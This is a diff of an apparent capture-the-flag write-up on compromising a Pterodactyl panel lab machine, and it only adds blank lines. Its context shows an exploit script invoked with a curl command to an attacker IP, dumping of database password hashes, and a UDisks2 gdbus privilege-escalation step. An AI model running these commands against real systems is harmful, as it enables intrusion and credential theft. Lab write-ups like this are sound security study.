@@ -36,7 +36,9 @@ Public                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 5
 ```
 
 changelog.txt 
+
 <img src="assets/Pasted image 20260212000816.png">
+
 Pterodactyl panel v1.11.10 
 
 ##### Gobuster (subdomain)
@@ -85,6 +87,7 @@ python3 ape1.py --host panel.pterodactyl.htb --command "curl http://10.10.14.56:
 ```
 
 cute
+
 <img src="assets/Pasted image 20260211235231.png">
 
 # Post exploitation
@@ -101,10 +104,13 @@ DB_DATABASE=panel
 connect to the database 
 
 <img src="assets/Pasted image 20260211235704.png">
+
 users table 
+
 <img src="assets/Pasted image 20260211235723.png">
 
 hashes !!! 
+
 <img src="assets/Pasted image 20260212000143.png">
 
 we can crack `phileasfogg3` hash ..and we get 
@@ -185,5 +191,7 @@ gdbus call --system --dest org.freedesktop.UDisks2 \
 ```
 
 ##### Verify root
+
 <img src="assets/Pasted image 20260212000719.png">
+
 we are part of the root group so we can say we did it 
